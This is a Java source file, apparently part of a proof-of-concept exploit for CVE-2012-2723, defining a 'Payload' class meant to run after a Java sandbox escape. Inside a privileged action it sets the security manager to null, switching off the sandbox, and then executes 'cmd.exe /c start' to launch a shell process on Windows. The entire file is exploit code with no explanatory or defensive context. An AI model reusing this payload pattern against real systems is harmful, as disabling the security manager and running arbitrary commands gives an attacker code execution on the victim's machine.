package me.ethaniel.cve20122723;

import java.security.AccessController;
import java.security.PrivilegedActionException;
import java.security.PrivilegedExceptionAction;

public class Payload implements PrivilegedExceptionAction {
    public Payload() {
        try {
            AccessController.doPrivileged(this);
        } catch (PrivilegedActionException e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object run() throws Exception {
        System.setSecurityManager(null);
        Runtime.getRuntime().exec("cmd.exe /c start");
        return null;
    }
}
